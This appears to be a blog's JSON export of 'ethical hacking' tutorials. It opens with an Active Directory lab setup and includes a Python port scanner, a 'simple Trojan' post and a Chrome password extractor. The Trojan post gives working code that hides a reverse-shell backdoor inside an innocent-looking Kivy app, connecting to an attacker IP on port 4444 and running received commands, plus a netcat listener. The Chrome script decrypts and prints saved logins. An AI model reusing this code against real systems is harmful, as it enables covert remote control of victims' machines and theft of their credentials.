let’s dive into user and group management—a crucial aspect of network security. In this scenario, imagine we’re setting up a lab for a fictional organization called \"TechSecure Corp.\"User Creation : User 1 : Alice Green Username : alice.green Role : Junior Administrator User 2 : Bob Smith Username : bob.smith Role : Developer User 3: Emma White Username : emma.white Role : QA Tester # Create UsersNew-ADUser -Name \"Alice Green\" -SamAccountName \"alice.green\" -UserPrincipalName \"alice.green@techsecure.local\" -Title \"Junior Administrator\" -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText \"Alice@2023!\" -Force)New-ADUser -Name \"Bob Smith\" -SamAccountName \"bob.smith\" -UserPrincipalName \"bob.smith@techsecure.local\" -Title \"Developer\" -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText \"Bob@2023!\" -Force)New-ADUser -Name \"Emma White\" -SamAccountName \"emma.white\" -UserPrincipalName \"emma.white@techsecure.local\" -Title \"QA Tester\" -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText \"Emma@2023!\" -Force)Organizing Users into Groups : Group 1 : Admins Members : Alice Green Permissions : Full administrative access to servers and Active Directory. Group 2 : Developers Members : Bob Smith Permissions : Access to development resources and shared project folders. Group 3 : Testers Members : Emma White Permissions : Limited access to testing environments and relevant resources. # Create GroupsNew-ADGroup -Name \"Admins\" -GroupScope Global -GroupCategory SecurityNew-ADGroup -Name \"Developers\" -GroupScope Global -GroupCategory SecurityNew-ADGroup -Name \"Testers\" -GroupScope Global -GroupCategory Security# Add Users to GroupsAdd-ADGroupMember -Identity \"Admins\" -Members \"alice.green\"Add-ADGroupMember -Identity \"Developers\" -Members \"bob.smith\"Add-ADGroupMember -Identity \"Testers\" -Members \"emma.white\"Assigning Appropriate Permissions :File Server Permissions : Shared Project Folder : Group Access : Developers have read/write access; Testers have read-only access. Admin Access : Administrators : Full control over shared resources. Active Directory Permissions : Admin Group: Admins Group : Full control over Active Directory settings. User Management : Developers Group: Limited user management capabilities for their team members. Testers Group: Basic user information access for their team members. # Note : This is a simplified example. In a real-world scenario, you would replace placeholders with actual file paths and server details.*# Create Folder C:\\SharedProjectsmkdir C:\\SharedProjects#Assume shared project folder is located at `\"C:\\SharedProjects\"`$projectFolderPath = \"C:\\SharedProjects\"$adminsGroup = Get-ADGroup -Filter {Name -eq \"Admins\"}$developersGroup = Get-ADGroup -Filter {Name -eq \"Developers\"}$testersGroup = Get-ADGroup -Filter {Name -eq \"Testers\"}# Grant permissions on the shared project folder# Administrators have full controlicacls $projectFolderPath /grant \"$($adminsGroup.Name):(F)\"# Developers have read/write accessicacls $projectFolderPath /grant \"$($developersGroup.Name):(R,W)\"# Testers have read-only accessicacls $projectFolderPath /grant \"$($testersGroup.Name):(R)\"# Assign Active Directory Permissions# Assume AD paths for user management and admin group$userManagementPath = \"OU=Users,DC=dc,DC=lab,DC=local\"$adminGroupPath = \"CN=Admins,OU=Groups,DC=dc,DC=lab,DC=local\"The Admins group has full control, and the Testers have read permission on the C:\\SharedProjects folder. However, Developers have special permissions. Even though we provide read and write permissions, what does that mean? Each file or folder has 18 types of permissions. Six of those are basic permissions visible under the Security tab, while the remaining 12 are advanced permissions exposed in advanced mode only. These advanced permissions are set automatically. Any modifications to the advanced permissions are flagged by a tick mark in the Special Permissions box.Real-world Application :*Scenario: Alice, a Junior Administrator, needs to create user accounts for new developers joining the team. She adds them to the Developers group, granting them the necessary permissions on the file server. Meanwhile, Bob, a Developer, requires access to project-related resources, which is facilitated through his group membership.*This scenario provides a glimpse into how user and group management in Active Directory plays out in a practical setting. Stay tuned as we explore the dynamic realm of Group Policy Configuration in the upcoming blog post!Diagram :6. Move Users To an Organizational UnitAn OU is a container within a Microsoft Windows Active Directory (AD) domain that can hold users, groups and computers. It is the smallest unit to which an administrator can assign Group Policy settings or account permissions.To streamline the application of Group Policy Objects (GPO), we need to create two Organizational Units (OUs), one for developers and another for QA Tester users. Let’s proceed with this configuration.# Create Developers OUNew-ADOrganizationalUnit -Name \"Developers\" -Path \"DC=dc,DC=lab,DC=local\"# Create QA Testers OUNew-ADOrganizationalUnit -Name \"QA Testers\" -Path \"DC=dc,DC=lab,DC=local\"With the OUs added, our next step is to move users into their respective OUs.# Moving emma.white user to QA Testers OU Get-ADUser -Identity \"emma.white\" | Move-ADObject -TargetPath \"OU=QA Testers,DC=dc,DC=lab,DC=local\" # Move bob.smith user to Developers OU Get-ADUser -Identity \"bob.smith\" | Move-ADObject -TargetPath \"OU=Developers,DC=dc,DC=lab,DC=local\"We have successfully added users to OUs. Let’s proceed to the Group Policy Objects (GPO) section.7. Group Policy ConfigurationAs we continue our journey through Active Directory mastery, we arrive at the fascinating realm of Group Policy Configuration. In this scenario, we’re tasked with enhancing the security posture of TechSecure Corp, our fictional organization.Creating and Applying Group Policies for Security : Password Complexity Policy :Strengthen password security to thwart unauthorized access Syntax Description Group Policy Setting 1.Creating a Group Policy Object (GPO) named PasswordPolicy.   2.Configuring the password complexity settings :   - Minimum password length: 10 characters.   - Require at least one uppercase letter, one lowercase letter, one digit, and one special character. Application Apply this GPO to the entire domain to enforce consistent password policies. # Creating Password Complexity Policy GPONew-GPO -Name \"PasswordPolicy\" $PasswordPolicyGPO = Get-GPO -Name \"PasswordPolicy\"Set-GPRegistryValue -Guid $PasswordPolicyGPO.Id -Key \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -ValueName \"MaxPasswordAge\" -Type DWord -Value 0# Link the GPO to the domain$domainName = \"dc.lab.local\"$gpoName = \"PasswordPolicy\"$gpo = Get-GPO -Name $gpoNameNew-GPLink -Name $gpo.DisplayName -Target $domainName -LinkEnabled YesAccount Lockout Policy:Mitigate the risk of brute force attacks by implementing account lockout measures. Syntax Description Group Policy Setting 1. Create a GPO named AccountLockoutPolicy.   2. Set account lockout threshold to 3 invalid login attempts, with a lockout duration of 15 minutes. Application Apply this GPO to the domain controllers to safeguard against unauthorized access attempts. # Creating Account Lockout Policy GPONew-GPO -Name \"AccountLockoutPolicy\"$AccountLockoutPolicyGPO = Get-GPO -Name \"AccountLockoutPolicy\"Set-GPRegistryValue -Guid $AccountLockoutPolicyGPO.Id -Key \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -ValueName \"LockoutDuration\" -Type DWord -Value 900# Linking GPO to specific OUs$ouDistinguishedName = \"OU=Developers,DC=dc,DC=lab,DC=local\"$gpoName = \"AccountLockoutPolicy\"$gpo = Get-GPO -Name $gpoNameNew-GPLink -Name $gpo.DisplayName -Target $ouDistinguishedName -LinkEnabled YesRestricting Command-Line Access :Employees in the RestrictedUsers group should be denied access to cmd and PowerShell. So we need to Limit command-line access for certain users to prevent misuse. Syntax Description Group Policy Setting 1.Creating a GPO named CmdPowerShellRestriction   2.Utilizing the Software Restriction Policies under Windows Settings to create a path rule denying execution for cmd.exe and powershell.exe for the RestrictedUsers group. Application Applying this GPO specifically to the RestrictedUsers group to enforce the restriction. # Creating Restricting Command-Line Access GPONew-GPO -Name \"CmdPowerShellRestriction\" $CmdPowerShellRestrictionGPO = Get-GPO -Name \"CmdPowerShellRestriction\"Set-GPRegistryValue -Guid $CmdPowerShellRestrictionGPO.Id -Key \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\Paths\" -ValueName \"C:\\Windows\\System32\\cmd.exe\" -Type DWord -Value 0x4Set-GPRegistryValue -Guid $CmdPowerShellRestrictionGPO.Id -Key \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\Paths\" -ValueName \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Type DWord -Value 0x4# Linking GPO to the \"QA testers\" OU$OUDistinguishedName = \"OU=QA testers,DC=dc,DC=lab,DC=local\" # Replace with your actual OUNew-GPLink -Name \"CmdPowerShellRestrictionLink\" -Target $OUDistinguishedName -LinkEnabled Yes -GPOName \"CmdPowerShellRestriction\"To force a Group Policy update on a local machine, you can use the following command:gpupdate /force# Or Invoke-GPUpdate -Computer ComputerName -Force Note : Ensure to perform this step on every local machine (both clients) to update the Group Policy Objects (GPO) promptly.8. Adding Machines to the DomainAs we progress in our Active Directory journey, the next phase involves integrating client machines into the domain. This crucial step sets the foundation for a unified network under the watchful eye of our Active Directory infrastructure.Preparing the Client Machine :Ensure the client machine has a valid IP address and can communicate with the domain controller.Confirm that the DNS settings on the client point to the Active Directory domain controller.Joining the Domain:To join a machine to a domain in Windows, we use use the Add-Computer PowerShell cmdlet :Add-Computer -DomainName dc.lab.local -Credential dc.lab.local\\Administrator -RestartIf everything is alright, the machine will restart, indicating that we have successfully added the machine user-1 to our domain dc.lab.local.Verification:After the machine has restarted, we can now log in with our user that we just added to the domain: bob.smith with the password Bob@2023!And in just a few minutes, the account setup will be complete.Verify the machine’s domain membership in the Acive Directory Users and Computers :Scenario : Bob, a Developer, is tasked with joining his Dev machine to the domain. Following the outlined steps, He is successfully integrates the machine into the TechSecure Corp domain.You can follow the same steps to add client 2 to the domain.9. Pentesting Tools InstallationAs we gear up for the exciting realm of penetration testing, the installation of essential tools becomes paramount. This segment focuses on deploying common penetration testing tools such as Bloodhound, impacket and Wireshark, ensuring our arsenal is well-equipped for comprehensive security assessments.I have created a table of tools that we will use in part two of this blog. Tools Description Impacket Impacket is a collection of Python classes for working with network protocols. PowerSploit PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. SharpCollection SharpCollection, Nightly builds of common C# offensive tools,     10. ConclusionAs we wrap up our Active Directory journey for penetration testing, let’s take a moment to reflect on the key steps and considerations that have shaped our exploration. This concluding chapter serves as a compass, guiding us through the intricate terrain of securing our network environment.Recap of Key Steps:Active Directory Domain Controller Setup:Successfully installed and configured the Active Directory Domain Controller, establishing the foundation for our secure network.User and Group Management:Implemented robust user and group management strategies, tailoring permissions and access based on roles within the organization.Create Organizational Units (OU): Organized users by adding them to OUs, making it simpler to link them with Group Policy Objects (GPO).Group Policy Configuration:Strengthened security through Group Policy Configuration, enforcing password complexity, account lockout policies, and even restricting command-line access for specific user groups.Adding Machines to the Domain:Integrated client machines seamlessly into the domain, fostering a unified network environment.Pentesting Tools Installation:Installed essential penetration testing tools like Impacket and Bloodhound , equipping our lab for comprehensive security assessments.Encouragement:As you embark on your penetration testing endeavors, remember that responsible and ethical use of your lab is paramount. Each step you take contributes to your growth as a cybersecurity professional, and your commitment to ethical hacking enhances the overall security landscape.Congratulations on completing this Active Directory journey! May your future exploits be both challenging and enlightening. Stay curious, stay secure, and keep pushing the boundaries of your cybersecurity expertise.Thank you for joining me on this adventure. Until our paths cross again in the vast realm of cybersecurity!" }, { "title": "How to Create a Simple Port Scanner With Python", "url": "/posts/Create-a-Simple-Port-Scanner-with-python/", "categories": "Ethical Hacking, python", "tags": "python", "date": "2022-09-24 13:00:00 +0100", "snippet": "Port scanning is a scanning method for determining which ports on a network device are open, whether it's a server, a router, or a regular machine. A port scanner is just a script or a program that...", "content": "Port scanning is a scanning method for determining which ports on a network device are open, whether it's a server, a router, or a regular machine. A port scanner is just a script or a program that is designed to probe a host for open ports.In this tutorial, you will be able to make your own port scanner in Python using the socket library. The basic idea behind this simple port scanner is to try to connect to a specific host (website, server, or any device connected to the Internet/network) through a list of ports. If a successful connection has been established, that means the port is open.For instance, when you loaded this web page, you made a connection to this website on port 80. Similarly, this script will try to connect to a host but on multiple ports. These kinds of tools are useful for hackers and penetration testers, so don't use this tool on a host that you don't have permission to test!EnumerSimple Port ScannerationRequirementsTo get started, let’s install the required libraries: Optionally, you need to install colorama module for printing in colorspip3 install coloramaLibrairiesFirst, let’s start by making a simple port scanner. Let’s import the socket module:import socket # for connectingfrom colorama import init, Fore# some colorsinit()GREEN = Fore.GREENRESET = Fore.RESETGRAY = Fore.LIGHTBLACK_EXa Note:socketmodule is already installed on your machine, it is a built-in module in the Python standard library, so you don’t have to install anything.The socket module provides us with socket operations, functions for network-related tasks, etc. They are widely used on the Internet, as they are behind any connection to any network. Any network communication goes through a socket. More details are in the official Python documentation.We will use colorama here just for printing in green colors whenever a port is open, and gray when it is closed.Start CodingLet’s define the function that is responsible for determining whether a port is open:def is_port_open(host, port): \"\"\" determine whether `host` has the `port` open \"\"\" # creates a new socket s = socket.socket() try: # tries to connect to host using that port s.connect((host, port)) # make timeout if you want it a little faster ( less accuracy ) # s.settimeout(0.2) except: # cannot connect, port is closed # return false return False else: # the connection was established, port is open! return True s.connect((host, port)) function tries to connect the socket to a remote address using the (host, port) tuple, it will raise an exception when it fails to connect to that host, that is why we have wrapped that line of code into a try-except block, so whenever an exception is raised, that’s an indication for us that the port is actually closed, otherwise it is open.Now let’s use the above function and iterate over a range of ports:# get the host from the userhost = input(\"Enter the host:\")# iterate over ports, from 1 to 1024for port in range(1, 1025): if is_port_open(host, port): print(f\"{GREEN}[+] {host}:{port} is open {RESET}\") else: print(f\"{GRAY}[!] {host}:{port} is closed {RESET}\", end=\"\\r\")The above code will scan ports ranging from 1 all the way to 1024, you can change the range to 65535 if you want, but that will take longer to finish.When you try to run it, you’ll immediately notice that the script is quite slow. Well, we can get away with that if we set a timeout of 200 milliseconds or so (using settimeout(0.2) method). However, this actually can reduce the accuracy of the reconnaissance, especially when your latency is quite high. As a result, we need a better way to accelerate this.ConclusionPort scanning proves to be useful in many cases. An authorized penetration tester can use this tool to see which ports are open and reveal the presence of potential security devices such as firewalls, as well as test the network security and the strength of a device.Happy Scanning :) " }, { "title": "How to Make a Simple Trojan with Python", "url": "/posts/make-a-simple-trojan-with-python/", "categories": "Ethical Hacking, python", "tags": "python", "date": "2022-09-23 13:00:00 +0100", "snippet": "For the ones who didn’t know yet, a Trojan Horse Attack consists of embedding en exploit in an innocent-looking Application, or even in a document. As you might have guessed today we will embed a b...", "content": "For the ones who didn’t know yet, a Trojan Horse Attack consists of embedding en exploit in an innocent-looking Application, or even in a document. As you might have guessed today we will embed a backdoor into a Kivy-made GUI. This attack is quite simple, the only thing you need to know is just some python and networking basics. Let us get started!EnumerationRequirementsTo get started, let’s install the required libraries:pip install kivypip install socketpip install threadedThe TrojanHow to build?The BackdoorAmong the many things we can embed in a Trojan Horse, I choose to embed a Backdoor. Basically, you can embed everything, but today we’ll embed a backdoor.The AppThis is a key point, we will use the Kivy framework in order to develop an Innocent-looking app, but as the Trojan attack says, it will contain the malicious backdoor, which we’ll use to gain access to the computer. From then, you’ll own the target’s computer. Disclaimer : I am not a graphical apps experienced developer, just use them when I need. So the Trojan we’ll build has not a good graphics, however, you’ll be able to imporove it on your own with the Kivy’s documentation.As said in the disclaimer, today we won’t focus on the graphic of the App, that can be easily improved just by going to Kivy’s Documentation, rather, we’ll focus on how to embed everything you want(here a Backdoor) in a graphical app.The Hacker’s Machinewe’ll just need to use Netcat and waitting for the response.open a Terminal Window and:nc -lnv 4444Start CodingNow it Is the moment to code our Trojan. Basically, we’ll organize using a function(a malicious one), and a class(the GUI). Such a simple code.from kivy.app import Appfrom kivy.uix.label import Labelimport threadingimport socketimport subprocessdef main(): server_ip = 'your_local_ip' port = 4444 backdoor = socket.socket() backdoor.connect((server_ip, port)) while True: command = backdoor.recv(1024) command = command.decode() op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE) output = op.stdout.read() output_error = op.stderr.read() backdoor.send(output + output_error)class App(App): def build(self): return Label(text=\"Hello World\")mal_thread = threading.Thread(target=main)mal_thread.start()app = App()app.run() Lines 1/2: Imported some Kivy basic modules. Lines 4/6: Imported the Socket and Subprocess module for the backdoor. Then the threading module in order to be able to execute both the malicious code and neutral(the GUI code). Lines 9/22: Used the code of the Backdoor Attack in Python article to create a main function that contains the backdoor. Lines 26/27: Build a “Hello World” simple GUI. Lines 31/32: Created a thread for the main() function and then started it (mal_thread.start()). Lines 35/36: Ran the simple GUI. On the Attacker MachineAs shown previously, we will be using Netcat to bind a port and listen for incoming connections. In this case, we will use the well known 4444 port. This command will give you no output until the Victim connects.nc -lvp 4444On the Target MachineAfter having started the attack on the Attacker’s Machine, we can complete it on the victim machine.Just export the code to the target machine and execute it, in order for the backdoor to work make sure you entered the right IP address at line 10.Once you execute the code on the Victim computer, you’ll see a Kivy app saying “hello world” on the victim’s, and you’ll see this on the Attacker’s side: So, we got a shell on the Victim computer using a Reverse Shell. Great!" }, { "title": "How to Extract Chrome Passwords in Python", "url": "/posts/extract-chrome-passwords-python/", "categories": "Ethical Hacking, python", "tags": "python", "date": "2022-09-08 13:00:00 +0100", "snippet": "Extracting saved passwords in the most popular browser is a useful and handy forensic task, as Chrome saves passwords locally in an SQLite database. However, this can be time-consuming when doing i...", "content": "Extracting saved passwords in the most popular browser is a useful and handy forensic task, as Chrome saves passwords locally in an SQLite database. However, this can be time-consuming when doing it manually.Since Chrome saves a lot of your browsing data locally on your disk, In this tutorial, we will write Python code to extract saved passwords in Chrome on your Windows machine. We will also make a quick script to protect ourselves from such attacks.EnumerationRequirementsTo get started, let’s install the required libraries:pip3 install pycryptodome pypiwin32LibrairiesOpen up a new Python file, and import the necessary modules:import osimport jsonimport base64import sqlite3import win32cryptfrom Crypto.Cipher import AESimport shutilfrom datetime import timezone, datetime, timedeltaStart CodingBefore going straight into extracting chrome passwords, we need to define some useful functions that will help us in the main function:def get_chrome_datetime(chromedate): \"\"\"Return a `datetime.datetime` object from a chrome format datetime Since `chromedate` is formatted as the number of microseconds since January, 1601\"\"\" return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)def get_encryption_key(): local_state_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\") with open(local_state_path, \"r\", encoding=\"utf-8\") as f: local_state = f.read() local_state = json.loads(local_state) # decode the encryption key from Base64 key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"]) # remove DPAPI str key = key[5:] # return decrypted key that was originally encrypted # using a session key derived from current user's logon credentials # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]def decrypt_password(password, key): try: # get the initialization vector iv = password[3:15] password = password[15:] # generate cipher cipher = AES.new(key, AES.MODE_GCM, iv) # decrypt password return cipher.decrypt(password)[:-16].decode() except: try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) except: # not supported return \"\" get_chrome_datetime() function is responsible for converting chrome date format into a human-readable date-time format. get_encryption_key() function extracts and decodes the AES key that was used to encrypt the passwords that are stored in the \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Local State\" path as a JSON file. decrypt_password() takes the encrypted password and the AES key as arguments and returns a decrypted version of the password. Below is the main function:def main(): # get the AES key key = get_encryption_key() # local sqlite Chrome database path db_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"default\", \"Login Data\") # copy the file to another location # as the database will be locked if chrome is currently running filename = \"ChromeData.db\" shutil.copyfile(db_path, filename) # connect to the database db = sqlite3.connect(filename) cursor = db.cursor() # `logins` table has the data we need cursor.execute(\"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created\") # iterate over all rows for row in cursor.fetchall(): origin_url = row[0] action_url = row[1] username = row[2] password = decrypt_password(row[3], key) date_created = row[4] date_last_used = row[5] if username or password: print(f\"Origin URL: {origin_url}\") print(f\"Action URL: {action_url}\") print(f\"Username: {username}\") print(f\"Password: {password}\") else: continue if date_created != 86400000000 and date_created: print(f\"Creation date: {str(get_chrome_datetime(date_created))}\") if date_last_used != 86400000000 and date_last_used: print(f\"Last Used: {str(get_chrome_datetime(date_last_used))}\") print(\"=\"*50) cursor.close() db.close() try: # try to remove the copied db file os.remove(filename) except: pass First, we get the encryption key using the previously defined get_encryption_key() function, then we copy the SQLite database (located at \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data\" that has the saved passwords to the current directory and connects to it; this is because the original database file will be locked when Chrome is currently running. After that, we make a select query to the logins table and iterate over all login rows. We also decrypt each password and reformat the date_created and date_last_used date times to a more human-readable format. Finally, we print the credentials and remove the database copy from the current directory. Let’s call the main function:if __name__ == \"__main__\": main()The output should be something like this format (obviously, I’m sharing fake credentials):Origin URL: https://accounts.google.com/SignUpAction URL: ttps://accounts.google.com/SignUpUsername: email@gmail.comPassword: rU91aQktOuqVzeqCreation date: 2020-05-25 07:50:41.416711Last Used: 2020-05-25 07:50:41.416711==================================================Origin URL: https://cutt.ly/registerAction URL: https://cutt.ly/registerUsername: email@example.comPassword: AfE9P2o5f5UCreation date: 2020-07-13 08:31:25.142499Last Used: 2020-07-13 09:46:24.375584==================================================Great, now you’re aware that a lot of sensitive information is in your machine and is easily readable using scripts like this one.Disclaimer: Please run this script on your machine or on a machine you have permission to access. We do not take any responsibility for any misuse.Deleting PasswordsAs you just saw, saved passwords on Chrome are quite dangerous to leave them there. Now you’re maybe wondering how we can protect ourselves from malicious scripts like this. In this section, we will write a script to access that database and delete all rows from logins table:import sqlite3import osdb_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"default\", \"Login Data\")db = sqlite3.connect(db_path)cursor = db.cursor()# `logins` table has the data we needcursor.execute(\"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created\")n_logins = len(cursor.fetchall())print(f\"Deleting a total of {n_logins} logins...\")cursor.execute(\"delete from logins\")cursor.connection.commit()This will require you to close the Chrome browser and then run it. Here is my output:Deleting a total of 204 logins...Once you open Chrome this time, you’ll notice that auto-complete on login forms is not there anymore. Run the first script as well, and you’ll notice it outputs nothing, so we have successfully protected ourselves from this!ConclusionIn this tutorial, you learned how to write a Python script to extract Chrome passwords on Windows, as well as delete them to prevent malicious users from being able to access them.Note that in this tutorial, we have only talked about \"Login Data\" file, which contains the login credentials. I invite you to explore that directory furthermore." } ]
